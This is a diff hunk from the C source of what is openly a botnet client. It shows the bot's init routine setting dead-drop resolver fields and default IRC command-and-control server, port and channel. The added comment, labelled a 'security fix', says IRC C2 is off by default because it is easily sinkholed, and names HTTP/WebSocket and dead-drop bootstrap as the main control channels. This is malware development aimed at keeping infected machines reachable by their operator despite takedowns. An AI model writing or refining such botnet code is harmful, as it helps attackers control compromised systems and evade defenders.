@@ -94,7 +94,12 @@ static int init_bot(void) {
     g_bot.dead_drop_url[0] = '\0';
     g_bot.dead_drop_interval = DEAD_DROP_DEFAULT_INTERVAL;
     
-    /* Set default C2 config */
+    /* Set default C2 config.
+     * SECURITY FIX (#87): IRC C2 is deprecated — trivially sinkholed and
+     * superseded by dead-drop resolution (#86). It is OFF by default
+     * (c2_enabled starts 0 above) and is not auto-enabled by a non-default
+     * port; only an explicit irc_enabled=1 in a config file turns it on.
+     * HTTP/WS + dead-drop bootstrap are the primary channels. */
     strncpy(g_bot.c2_irc.server, IRC_DEFAULT_SERVER, sizeof(g_bot.c2_irc.server) - 1);
     g_bot.c2_irc.port = IRC_DEFAULT_PORT;
     strncpy(g_bot.c2_irc.channel, IRC_DEFAULT_CHANNEL, sizeof(g_bot.c2_irc.channel) - 1);
